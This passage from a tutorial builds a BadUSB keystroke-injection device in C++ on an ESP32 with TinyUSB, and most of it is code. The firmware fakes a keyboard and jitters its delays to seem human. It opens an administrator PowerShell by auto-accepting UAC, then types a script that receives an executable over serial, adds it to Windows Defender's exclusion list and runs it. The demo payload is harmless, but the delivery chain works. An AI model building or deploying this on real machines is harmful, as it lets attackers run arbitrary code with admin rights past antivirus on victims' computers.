### 4.2.1. Key and Modifier Code

In order to extract the codes from the `uint16_t` stored in the table, bit operations are required. That code then has to be used to create one of the two Enum classes created previously, see [Layout Interface](#41-layout-interface). 

````c++
constexpr layout::Keycode extract_keycode(uint16_t codeAndModifier)
{
    auto code = static_cast<uint8_t>(codeAndModifier & 0x00'FF);
    return layout::Keycode{ code };
}
constexpr layout::KeyModifier extract_modifier(uint16_t codeAndModifier)
{
    auto modifier = static_cast<uint8_t>((codeAndModifier & 0xFF'00) >> 8);
    return layout::KeyModifier{ modifier };
}
````

Lets add an additional helper function that will make it so the codes are returned in a way that can utilize structured bindings.

````c++
constexpr std::tuple<layout::Keycode, layout::KeyModifier> extract_code_and_modifier(uint16_t codeModifer)
{
    return { extract_keycode(codeModifer), extract_modifier(codeModifer) };
}
````

### 4.2.2. Reporting Codes to TinyUSB

Once the key and modifier code has been obtained they need to be reported to TinyUSB. Which in turn will update its internals do make sure the target host will be able to poll the key presses. Most key combinations will use one or no modifier. But there are key combinations that use *n* modifiers. Therefore the function that will report the key combination has to be variadic.

If there are multiple modifier codes, they need to be OR'd together. So lets first create a function for this.

````c++
template<typename... modifier_t>
requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
uint8_t combine_modifiers(modifier_t... modifiers)
{
    static_assert((std::is_same_v<uint8_t, std::underlying_type_t<modifier_t>> && ...));
    return (static_cast<uint8_t>(modifiers) | ...);
}
````

With the help of fold expressions its trivial to OR *n* amount of codes together. The static assert is there to make sure that the underlying type of the Enum corresponds with what TinyUSB expects. With that done the next function to write is the one that will actually report the codes.

The static assert is again there to make sure that the Enum (for the keycode this time) is what TinyUSB expects. This keycode is then stored in a six byte array. I believe this is TinyUSB's way of supporting multiple switches being pressed at the same time. 

````c++
template<typename... modifier_t>
requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
bool report_keycode_and_modifiers(layout::Keycode code, modifier_t... modifiers)
{
    static_assert(std::is_same_v<uint8_t, std::underlying_type_t<decltype(code)>>);
    auto c = static_cast<uint8_t>(code);
    uint8_t modifier = details::combine_modifiers(std::forward<modifier_t>(modifiers)...);
    uint8_t keycode[6] = { c };
    if (!tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, modifier, keycode))
    {
        LOG_WARN("Failed to send keycode: \"{}\". With modifier: \"{}\"", c, modifier);
        return false;
    }

    return true;
}
````

### 4.2.3. Pressing Keys

Its now possible to create a member function to press any key combination.

````c++
class AsciiKeyboard
{
public:
    template<typename... modifier_t>
    requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
    bool press_key(layout::Keycode keycode, modifier_t... modifiers) const
    {
        bool success = details::report_keycode_and_modifiers(keycode, std::forward<modifier_t>(modifiers)...);
        if (!success)
        {
            LOG_ERR("Failed to report Keycode: {}", static_cast<std::underlying_type_t<decltype(keycode)>>(keycode));
            return false;
        }
        return true;
    }
};
````

There are however a couple of caveats here. First of all, when a keycode is reported it is actually updating some internal state in TinyUSB. This state is what the host is continuously polling. This in turn means that if a keycode is reported once and nothing else is. Then it would be like that key is being held, not pressed and released. This means that in order to simulate a key press, the key release also has to be simulated. Which is done by simply clearing TinyUSB's internal state by reporting that no key is being pressed.

````c++
bool AsciiKeyboard::release_key() const
{
    return report_keycode_and_modifiers(layout::Keycode::NONE, layout::KeyModifier::NONE);
}
````

By calling the `release_key()` function afterwards it will now be as if the key is pressed down, and then released. 

````c++
class AsciiKeyboard
{
public:
    template<typename... modifier_t>
    requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
    bool press_key(layout::Keycode keycode, modifier_t... modifiers) const
    {
        bool success = details::report_keycode_and_modifiers(keycode, std::forward<modifier_t>(modifiers)...);
        if (!success)
        {
            LOG_ERR("Failed to report Keycode: {}", static_cast<std::underlying_type_t<decltype(keycode)>>(keycode));
            return false;
        }
        success = release_key();
        if (!success)
        {
            LOG_ERR("Failed to report key relase");
            return false;
        }
        return true;
    }
};
````

The second caveat here is the fact that because this is software it will execute at much faster rate than what the host is polling the HID device at. Therefore if this function is called as it stands, the software will report the keycode to TinyUSB *and* the "release" of that key **before** the host has a chance to poll for the changes! This would of course result in the host not detecting any keypresses, so nothing happens.

The way to solve this is with artificial delay. For now the easiest way to implement this is by simply calling `vTaskDelay(...)`. i.e. `sleep()`. This is far from ideal as it obviously will temporarily halt the entire system. A more correct approach would be to push each key press (and release) to a queue. Then have this queue be popped once every *x* MS with the help of a timer. Checking the timer and popping the queue could be done once per frame. Or alternatively, have its own dedicated thread.

The time waited is based on the polling rate, which was set in [Device Class: HID](#31-device-class-hid). This implementation set the polling rate to 10 ms. Therefore the wait has to be greater than 10 ms. Introducing sleep to the function will then make it look like so:

````c++
class AsciiKeyboard
{
public:
    template<typename... modifier_t>
    requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
    bool press_key(layout::Keycode keycode, modifier_t... modifiers) const
    {
        bool success = details::report_keycode_and_modifiers(keycode, std::forward<modifier_t>(modifiers)...);
        if (!success)
        {
            LOG_ERR("Failed to report Keycode: {}", static_cast<std::underlying_type_t<decltype(keycode)>>(keycode));
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(15));
        success = release_key();
        if (!success)
        {
            LOG_ERR("Failed to report key relase");
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(15));
        return true;
    }
};
````


### 4.2.4. Jittered Delay

When the delay is set to a fixed number (15 MS in this case), it becomes robotic. Its possible to make the input appear a little bit more human by randomizing the delay. This can be solved fairly simply with a single function.


````c++
void jittered_delay(int32_t ms, int32_t interval)
{
    static std::mt19937 mersenne{ static_cast<uint_fast32_t>(timed_seed()) };

    int32_t jitter = mersenne() % interval;
    jitter = jitter - interval / 2;
    ms = ms + jitter;

    vTaskDelay(pdMS_TO_TICKS(ms));
}
````

When done like this, providing a delay of 20 MS with an interval of 10 would result in a 15 - 25 MS delay. Next lets a helper function that will call the `jittered_delay(...)` function with a set interval, so only the MS argument is exposed.


````c++
void key_press_delay(int32_t ms)
{
    int32_t interval = 10;
    jittered_delay(ms, interval);
}
````

Then lets replace the calls to `vTaskDelay(...)` with this function in `press_key(...)`.

````c++
class AsciiKeyboard
{
public:
    template<typename... modifier_t>
    requires (std::same_as<modifier_t, layout::KeyModifier> && ...)
    bool press_key(layout::Keycode keycode, modifier_t... modifiers) const
    {
        bool success = details::report_keycode_and_modifiers(keycode, std::forward<modifier_t>(modifiers)...);
        if (!success)
        {
            LOG_ERR("Failed to report Keycode: {}", static_cast<std::underlying_type_t<decltype(keycode)>>(keycode));
            return false;
        }
        key_press_delay(15);
        success = release_key();
        if (!success)
        {
            LOG_ERR("Failed to report key relase");
            return false;
        }
        key_press_delay(15);

        return true;
    }
};
````

### 4.2.5. Writing ASCII Characters

While its great to have a function that makes it possible to send any key combination. Lets simplify the interface by also exposing a function that takes a single `char` as a parameter.

A requirement to make that possible is a function that will lookup the keycode and its respective modifiers in the layout's table. If the index argument happens to be out of bounds, the *ASSERT* statement will break execution (in debug builds) to aid in debugging and detecting out of bound errors.

````c++
class AsciiKeyboard
{
    constexpr std::tuple<layout::Keycode, layout::KeyModifier> get_keycode_and_modifier(std::size_t index) const
    {
        ASSERT(index < m_KeycodeTable.size());
        if (index >= m_KeycodeTable.size())
        {
            LOG_ERR("Index out of bounds.");
            return { layout::Keycode::NONE, layout::KeyModifier::NONE };
        }

        uint16_t codeAndModifer = m_KeycodeTable[index];
        return extract_code_and_modifier(codeAndModifer);
    }
};
````

The private member function to write ASCII characters will then call `get_keycode_and_modifier(...)` and `report_keycode_and_modifiers(...)`. In order to make sure that the passed argument is a writeable ASCII character, it'll first check that the argument is one of the expected values. 

````c++
bool AsciiKeyboard::write_ascii(char c) const
{
    ASSERT(c >= 32 && c <= 126);
    if (c < 32 || c > 126)
    {
        LOG_ERR("Tried to write a non-writable ASCII character");
        return false;
    }

    std::size_t index = c - 32;
    auto[code, modifier] = get_keycode_and_modifier(index);
    return report_keycode_and_modifiers(code, modifier);
}
````

The final function exposed to the caller will then call `write_ascii(...)`, insert delays and then call `release_key()`.

````c++
bool AsciiKeyboard::press_key(char c) const
{
    if(!write_ascii(c))
    {
        LOG_ERR("Failed to write {}.", c);
        return false;
    }
    key_press_delay(15);
    if(!release_key())
    {
        LOG_ERR("Failed to release key: {}.");
        return false;
    }
    key_press_delay(15);
    return true;
}
````

### 4.2.6. Accessing PowerShell

There are multiple ways of opening a PowerShell terminal in windows by using keyboard shortcuts. E.g. its possible to open the Quick Link menu by pressing **Win + X**. From here all of the different options has a key binding, including the PowerShell terminal. However, these key bindings are tied to the system language. Therefore it would become burdensome to use this path. Since every single language would require its own shortcuts. 

Opening a PowerShell terminal in a language agnostic way can be done with the *Run Command*, which can be opened by pressing **Win + R**. From here one would simply type *powershell* and press enter and the terminal will open. The caveat being that this terminal would **not** run in *Administrator mode*. In order to achieve that, it is required to instead press **CTRL + SHIFT + ENTER**. This will open the *UAC* prompt which can be navigated with **LEFT ARROW** and **ENTER**.

The code that has been written makes it possible to use the `AsciiKeyboard` to achieve this. Lets create a free function that uses a keyboard object to open the *Run Command* window and writing the name of the program to execute. Once the name of the program have been written, it'll open it as *Administrator*.

````c++
bool run_command(const AsciiKeyboard& keyboard, std::string_view program)
{
    if(!keyboard.press_key(layout::Keycode::R, layout::KeyModifier::LEFTGUI))
    {
        return false;
    }

    for (const char c : program)
    {
        if(!keyboard.press_key(c))
        {
            return false;
        }
    }

    return keyboard.press_key(layout::Keycode::ENTER, layout::KeyModifier::LEFTCTRL, layout::KeyModifier::LEFTSHIFT);
}
````

There is an issue with the code snippet above. Since its interacting with the Windows GUI and this GUI contains animations. The *Run Command* (or any other window) won't open instantaneously. This means that again there has to be a wait or delay issued. Before moving on to the next steps, which in this case is to try and write the name of the program to execute. Lets therefore add a simple sleep yet again.

````c++
void wait_for_animation(int32_t ms)
{
    int32_t interval = 25;
    jittered_delay(ms, interval);
}
````

`run_command(...)` then becomes:

````c++
bool run_command(const AsciiKeyboard& keyboard, std::string_view program, int32_t animationTime)
{
    if(!keyboard.press_key(layout::Keycode::R, layout::KeyModifier::LEFTGUI))
    {
        return false;
    }
    wait_for_animation(animationTime);

    for (const char c : program)
    {
        if(!keyboard.press_key(c))
        {
            return false;
        }
    }

    return keyboard.press_key(layout::Keycode::ENTER, layout::KeyModifier::LEFTCTRL, layout::KeyModifier::LEFTSHIFT);
}
````


When the Run Command is executed as Administrator, the UAC prompt will show up. This of course has to be accepted, which can be done by navigating the prompt using the arrow keys and enter.

````c++
bool AsciiKeyboard::press_arrow_left() const
{
    return press_key(layout::Keycode::LEFT, layout::KeyModifier::NONE);
}
````

````c++
bool AsciiKeyboard::press_enter() const
{
    return press_key(layout::Keycode::ENTER, layout::KeyModifier::NONE);
}
````

These functions can then be used to accept the UAC prompt. Like the other GUI elements, the UAC prompt will not open instantaneously. Therefore a delay is again required.

````c++
bool accept_uac(const AsciiKeyboard& keyboard, int32_t animationTime)
{
    wait_for_animation(animationTime);
    if(!keyboard.press_arrow_left())
    {
        return false;
    }
    return keyboard.press_enter();
}
````

Finally its now possible to create a function to directly open the terminal, by calling the previous two functions (`run_command(...)` and `accept_uac(...)`).

````c++
bool open_terminal(const AsciiKeyboard& keyboard, int32_t runCommandWait, int32_t uacWait, int32_t terminalWait)
{
    if(!run_command(keyboard, "powershell", runCommandWait))
    {
        LOG_ERR("Failed to open PowerShell.");
        return false;
    }
    if(!accept_uac(keyboard, uacWait))
    {
        LOG_ERR("Failed to accept UAC.");
        return false;
    }
    wait_for_animation(terminalWait);
    return true;
}
````

# 5. Transferring the Payload

With the code needed to open a terminal as Administrator, all that is left is to have the host request a serial download of the payload. Accomplishing this through PowerShell is trivial, as it has full access to *.NET*. This allows for use of the `System.IO.Ports.SerialPort` class.

## 5.1. Injected PowerShell Script

Since its not possible to know before hand which COM port the BadUSB device will actually show up as, the first step is to query all of the available ports. The correct port will be identified through a (very) simple handshake. 

Once the host has opened a serial connection it'll send `0xBEEF`, and expect `0xDEAD` in return. If the device on the other end responds with anything else the connection is closed. No response are handled by setting the read timeout to 50ms.

When the correct device has been identified it will send the size of the payload as a 4 byte integer, followed by the payload itself. After the full payload has been transferred the script will store it to the desktop and add it to *Windows Defender's* exclusion list. This makes sure that it's possible to execute the payload without *Defender* interfering.

````powershell
function Read { param($serial, $count)
    $buffer = New-Object byte[] $count
    $offset = 0
    while ($offset -lt $count) {
        $read = $serial.Read($buffer, $offset, ($count - $offset))
        $offset += $read
    }
    return $buffer
}

$ports = [System.IO.Ports.SerialPort]::GetPortNames()
if ($ports.Length -gt 0) {
    foreach ($port in $ports) {
        $serial = New-Object System.IO.Ports.SerialPort($port, 115200, 'None', 8, 'One')
        $serial.ReadTimeout = 50

        $serial.Open()
        if ($serial.IsOpen) {
            [byte[]] $handshake = 0xB, 0xE, 0xE, 0xF
            $serial.Write($handshake, 0, 4)
            $answer = Read $serial 4
            if (-not (Compare-Object $answer (0xD,0xE,0xA,0xD))) {
                $readSize = Read $serial 4
                $size = [BitConverter]::ToInt32($readSize, 0)

                if ($size -gt 0) {
                    $payload = New-Object byte[] $size
                    $offset = 0
                    $payload = Read $serial $size

                    $path = Join-Path $HOME "Desktop/payload.exe"
                    [System.IO.File]::WriteAllBytes($path, $payload)
                    Add-MpPreference -ExclusionPath $path
                    & $path
                }
            }
            $serial.Close()
        }
    }
}
````

This script works but there is a fairly big problem. That is that each *character* in the script has to be written. Since each keystroke were set to have a delay, this will take some time. If the polling rate were set to 10 ms, then the theoretical minimum time would be **numChars * 10ms**. It therefore has to be shortened. 

First of all, all variables do not need to have full readable names and can simply be shortened to a single letter. 

````powershell
function Read { param($s, $c)
    $b = New-Object byte[] $c
    $o = 0
    while ($o -lt $c) {
        $r = $s.Read($b, $offset, ($c - $o))
        $o += $r
    }
    return $b
}

$n = [System.IO.Ports.SerialPort]::GetPortNames()
if ($n.Length -gt 0) {
    foreach ($p in $n) {
        $s = New-Object System.IO.Ports.SerialPort($p, 115200, 'None', 8, 'One')
        $s.ReadTimeout = 50

        $s.Open()
        if ($s.IsOpen) {
            [byte[]] $h = 0xB, 0xE, 0xE, 0xF
            $s.Write($h, 0, 4)
            $a = Read $s 4
            if (-not (Compare-Object $a (0xD,0xE,0xA,0xD))) {
                $r = Read $s 4
                $s = [BitConverter]::ToInt32($r, 0)

                if ($s -gt 0) {
                    $m = New-Object byte[] $s
                    $m = Read $s $s

                    $f = Join-Path $HOME "Desktop/payload.exe"
                    [System.IO.File]::WriteAllBytes($f, $m)
                    Add-MpPreference -ExclusionPath $f
                    & $f
                }
            }
            $s.Close()
        }
    }
}
````

### 5.1.1. Removing Whitespace

Secondly, all indentation has to go. But since this makes the script a complete mess. It'll be easier to do this at runtime when "writing" the script. Especially since newlines has to be dealt with as well. Remember, there is no "newline" on a keyboard. Instead this is application specific. In a text editor this is accomplish with the `Enter` key, but in a PowerShell terminal the `Enter` key would execute whatever has been written. Thus this has to be dealt with on a case by case basis.

The simplest way to remove indentation is to simply skip each white space that is adjacent to another white space. Not all white spaces can be skipped, since they are used to delimit parameters in PowerShell, e.g. `$r = Read $s 4`. Skipping indentation then can be done by looping and incrementing the index as long as the *next* character is also a white space.

````c++
for (std::size_t i = 0; i < code.size(); ++i)
{
    char c = code[i];
    switch (c)
    {
    case ' ':
    {
        if (i < code.size() - 1)
        {
            std::size_t nextChar = i + 1;
            while (code[nextChar] == ' ' && i < code.size())
            {
                ++i;
                nextChar = i + 1;
            }
        }
        keyboard.press_key(' ');
        break;
    };
    // ...
    }
}
````

With indentation trimmed all that remains is to handle newlines. Much like in Python, it is possible to use **;** to delimit commands. Therefore all the newlines should simply be replaced by a semicolon instead. 

````c++
for (std::size_t i = 0; i < code.size(); ++i)
{
    char c = code[i];
    switch (c)
    {
    case ' ':
    {
        // ...
    };
    case '\n': keyboard.press_key(';'); break;
    // ...
    }
}
````

This solution is simple, but there are some caveats to be aware of. E.g. if you write PowerShell with functions and use the [Allman](https://en.wikipedia.org/wiki/Indentation_style#Allman_style)
 code style. Then you would end up with broken syntax.

````powershell
function Read;{  };
````

Instead the opening brace must be placed on the same line as the function name. This makes sure that the semicolon does not delimit the entire function body.

````powershell
function Read{;  };
````

The remaining characters will simply be written as is.

````c++
for (std::size_t i = 0; i < code.size(); ++i)
{
    char c = code[i];
    switch (c)
    {
    // ...
    default: keyboard.press_key(c); break;
    }
}
````

The complete helper function to send a script then becomes:

````c++
[[nodiscard]] static bool send_script(const usb::AsciiKeyboard& keyboard, std::string_view code)
{
    bool success = true;
    for (std::size_t i = 0; i < code.size(); ++i)
    {
        if (!success)
        {
            break;
        }

        char c = code[i];
        switch (c)
        {
        case ' ':
        {
            if (i < code.size() - 1)
            {
                std::size_t nextChar = i + 1;
                while (code[nextChar] == ' ' && i < code.size())
                {
                    ++i;
                    nextChar = i + 1;
                }
            }
            success = keyboard.press_key(' ');
            break;
        };
        case '\n': success = keyboard.press_key(';'); break;
        default: success = keyboard.press_key(c); break;
        }
    }
    if (success)
    {
        success = keyboard.press_enter();
    }

    return success;
}
````

The script itself is then simply pasted into the translation unit and passed to the helper function above:

````c++
static constexpr std::string_view code =
    R"(function Read { param($s, $c)
            $b = New-Object byte[] $c
            $o = 0
            while ($o -lt $c) {
                $r = $s.Read($b, $o, ($c - $o))
                $o += $r
            }
            return $b
        }

        $n = [System.IO.Ports.SerialPort]::GetPortNames()
        if ($n.Length -gt 0) {
            foreach ($p in $n) {
                $s = New-Object System.IO.Ports.SerialPort($p, 115200, 'None', 8, 'One')
                $s.ReadTimeout = 50

                $s.Open()
                if ($s.IsOpen) {
                    [byte[]] $h = 0xB, 0xE, 0xE, 0xF
                    $s.Write($h, 0, 4)
                    $a = Read $s 4
                    if (-not (Compare-Object $a (0xD,0xE,0xA,0xD))) {
                        $r = Read $s 4
                        $i = [BitConverter]::ToInt32($r, 0)

                        if ($i -gt 0) {
                            $m = Read $s $i

                            $f = Join-Path $HOME "Desktop/payload.exe"
                            [System.IO.File]::WriteAllBytes($f, $m)
                            Add-MpPreference -ExclusionPath $f
                            & $f
                        }
                    }
                    $s.Close()
                }
            }
        })";

send_script(keyboard, code);
````

## 5.2. Responding to the Handshake Request

Now the BadUSB device itself has to read and react to the handshake request from the host. This is straight forward because it were prepared previously, see [Device Class: CDC](#32-device-class-cdc). Therefore all that is required is to set the callback for incoming data transfers. Which should look like this:

````c++
static bool readHandshake = false;
driver.set_cdc_rx_callback([](int interface, cdcacm_event_t* pEvent)
{
    readHandshake = true;
});
````

There are a couple of things to note here. First of since the argument to `set_cdc_rx_callback(...)` is a function pointer, the lambda cannot use captures. To circumvent this the value can be placed in the *.bss* section instead by making it static. Secondly, the actual writing and reading of data will be done on the main thread. The reason for this is that TinyUSB will block and be unable to flush the writing buffer if writing is done on the same thread that handles the callbacks.

### 5.2.1. Reading and Writing over CDC

The functionality to read and write over CDC can be done in many ways, such as through free functions. But here it will be done through the `Driver<...>` type. As it makes it possible to add static asserts, which will aid in catching bugs at compile time.


````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    template<std::size_t n>
    void cdc_write(const std::array<std::uint8_t, n>& buffer)
    {
        static_assert((std::same_as<device_class_t, CDC> || ...),
            "Writing data over CDC requires the USB driver to be initialized with CDC support.");

        std::size_t offset{};
        while (offset < buffer.size())
        {
            auto bytesRemaining = static_cast<std::uint32_t>(buffer.size() - offset);
            std::uint32_t bytesToQueue = std::min(tud_cdc_n_write_available(CDC::acm_interface()), bytesRemaining);
            tinyusb_cdcacm_write_queue(CDC::acm_interface(), buffer.data() + offset, buffer.size());

            static constexpr std::uint32_t TIMEOUT = 0u;
            esp_err_t err = tinyusb_cdcacm_write_flush(CDC::acm_interface(), TIMEOUT);
            if (err != ESP_OK)
            {
                LOG_WARN("Failed to flush after CDC write.");
            }

            offset = offset + bytesToQueue;
        }
    }
}
````

The static assert is a basic fold expression that will check each `device_class_t` that the `Driver<...>`type was specialized with. It expects that one of them should be the same type as the `CDC` type. Thus enforcing that the USB device has been initiated to support CDC.

The main loop will go through the provided buffer and write as much as it can. Each iteration it will start at a new offset, further into the buffer. TinyUSB's buffer (queue) where the data to be written are stored is fixed size. TinyUSB will try to write (flush) as much as it can from this buffer when its full, or when `tinyusb_cdcacm_write_queue(...)` is called. The point is that the amount of bytes that can actually be pushed onto the queue varies. Therefore it is important to call `tud_cdc_n_write_available(...)`, in order to check how many bytes are available. After each chunk of data has been pushed onto the queue, the function will try to manually flush it. 


````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    template<std::size_t n>
    [[nodiscard]] bool cdc_read(std::array<std::uint8_t, n>& outBuffer, std::uint32_t maxTries)
    {
        static_assert((std::same_as<device_class_t, CDC> || ...),
            "Reading data over CDC requires the USB driver to be initialized with CDC support.");

        bool success = true;
        std::size_t bytesRead{};
        std::uint32_t numTries{};
        while (bytesRead < outBuffer.size() && numTries < maxTries)
        {
            esp_err_t err = tinyusb_cdcacm_read(CDC::acm_interface(), outBuffer.data(), outBuffer.size(), &bytesRead);
            if (err != ESP_OK)
            {
                LOG_ERR("Error when reading CDC data.");
                success = false;
                break;
            }
            ++numTries;
        }

        return success;
    }
}
````

The `cdc_read(...)` function, as the name suggests, are responsible for storing incoming serial data. It has to continuously read incoming data until it has filled the buffer, or it reaches its maximum amount of attempts. Which ever comes first.


## 5.3. The Payload

Because payloads can be quite large, a production device would have to have access to extra storage. This could be through the use of extra flash memory or a micro SD card. Never the less, for this tutorial the payload is a simple "hello world" program. Therefore its small enough to store directly in the firmware, which is what will be done.

As mentioned, the "payload" that will be used to demonstrate the BadUSB is a simply hello world program. The code for it will be as simple as:

````c++
#include <cstdio>

int main()
{
    std::printf("Hello BadUSB!");

    return 0;
}
````


### 5.3.1. From Executable to Array

In order to store the payload program in the firmware its bytes needs to be placed in an array. Since even the smallest of programs are multiple KB's (!), this is not possible to do by hand. Therefore the easiest way is to write yet another program that will open the payload executable, read its content and then write it out to a text file. While at the same time making sure to format it correctly so the output will be a `std::array`.

````c++
#include <filesystem>
#include <format>
#include <fstream>
#include <string>
#include <string_view>
#include <vector>


int main(int argc, char** argv)
{
    if (argc < 3)
    {
        std::printf("Usage: ./run.exe filepath_payload filepath_output");
        return 1;
    }

    std::string_view payloadPath{ argv[1] };
    std::string_view outputPath{ argv[2] };

    std::fstream file{ payloadPath.data(), std::ios::in | std::ios::binary };
    if (!file.is_open())
    {
        std::printf("Failed to open %s", payloadPath.data());
        return 2;
    }


    std::vector<char> data{};
    data.resize(std::filesystem::file_size(payloadPath));
    file.read(data.data(), data.size());

    std::string code = std::format("static constexpr std::array<std::uint8_t, {}> payload {{", data.size());
    for (auto&& byte : data)
    {
        code += std::format("0x{:02X}, ", byte);
    }

    // Remove trailing white space
    code.pop_back();
    // Remove trailing comma
    code.pop_back();

    code += " };";


    std::fstream outfile{ outputPath.data(), std::ios::out | std::ios::binary | std::ios::trunc };
    outfile.write(code.c_str(), code.size());

    return 0;
}
````

This text file can then simply be opened and its content copy and pasted into whatever translation unit you want, or alternatively into a header which can then be included.

### 5.3.2. Sending the Payload

All that is required now is to send the handshake response and the payload itself. Remember that in [Responding to the Handshake Request](#52-responding-to-the-handshake-request), the callback function for incoming CDC data were set to toggle the `readHandshake` variable to true. This variable is then used to check whether or not our USB device has been contacted or not. If it has, then it should attempt to send the handshake response and the accompanying payload.

The `tud_mounted()` function is a TinyUSB function, and all it does is check whether or not our USB device has been correctly mounted to the host.


````c++
if (tud_mounted() && readHandshake)
{
    readHandshake = false;

    std::array<std::uint8_t, 4> handshake{};
    std::uint32_t MAX_TRIES = 10;
    if(d.cdc_read(handshake, MAX_TRIES))
    {
        static constexpr std::array<std::uint8_t, 4> hello{ 0xD, 0xE, 0xA, 0xD };
        d.cdc_write(hello);

        // host expects the size stored in 4 bytes
        auto size = static_cast<std::int32_t>(payload.size());
        std::array<uint8_t, sizeof size> s{};
        std::memcpy(s.data(), &size, s.size());
        d.cdc_write(s);

        d.cdc_write(payload);
    }
}
````



There! The full BadUSB implementation's main function now looks like this:

````c++
extern "C" void app_main()
{
    usb::Driver<usb::CDC, usb::HID> d{};
    static bool readHandshake = false;
    d.set_cdc_rx_callback([](int interface, cdcacm_event_t* pEvent)
    {
        readHandshake = true;
    });

    usb::AsciiKeyboard keyboard{ usb::layout::Swedish{} };

    bool attempt = true;
    while(attempt)
    {
        vTaskDelay(pdMS_TO_TICKS(50));
        if (tud_mounted() && readHandshake)
        {
            readHandshake = false;

            std::array<uint8_t, 4> handshake{};
            std::uint32_t MAX_TRIES = 10;
            if(d.cdc_read(handshake, MAX_TRIES))
            {
                static constexpr std::array<uint8_t, 4> hello{ 0xD, 0xE, 0xA, 0xD };
                d.cdc_write(hello);

                // host expects the size stored in 4 bytes
                auto size = static_cast<std::int32_t>(payload.size());
                std::array<uint8_t, sizeof size> s{};
                std::memcpy(s.data(), &size, s.size());
                d.cdc_write(s);

                d.cdc_write(payload);
            }
        }

        static bool writePowershell = true;
        if (writePowershell && keyboard.ready_to_use())
        {
            writePowershell = false;

            usb::open_terminal(keyboard, 400, 800, 600);
            static constexpr std::string_view code =
                R"(function Read { param($s, $c)
                        $b = New-Object byte[] $c
                        $o = 0
                        while ($o -lt $c) {
                            $r = $s.Read($b, $o, ($c - $o))
                            $o += $r
                        }
                        return $b
                    }

                    $n = [System.IO.Ports.SerialPort]::GetPortNames()
                    if ($n.Length -gt 0) {
                        foreach ($p in $n) {
                            $s = New-Object System.IO.Ports.SerialPort($p, 115200, 'None', 8, 'One')
                            $s.ReadTimeout = 50

                            $s.Open()
                            if ($s.IsOpen) {
                                [byte[]] $h = 0xB, 0xE, 0xE, 0xF
                                $s.Write($h, 0, 4)
                                $a = Read $s 4
                                if (-not (Compare-Object $a (0xD,0xE,0xA,0xD))) {
                                    $r = Read $s 4
                                    $i = [BitConverter]::ToInt32($r, 0)
                                    Write-Output "Size: $i"
                                    if ($i -gt 0) {
                                        $m = New-Object byte[] $i
                                        $m = Read $s $i

                                        $f = Join-Path $HOME "Desktop/payload.exe"
                                        [System.IO.File]::WriteAllBytes($f, $m)
                                        Add-MpPreference -ExclusionPath $f
                                        & $f
                                    }
                                }
                                $s.Close()
                            }
                        }
                    })";
            send_script(keyboard, code);
        }
    }
}
````
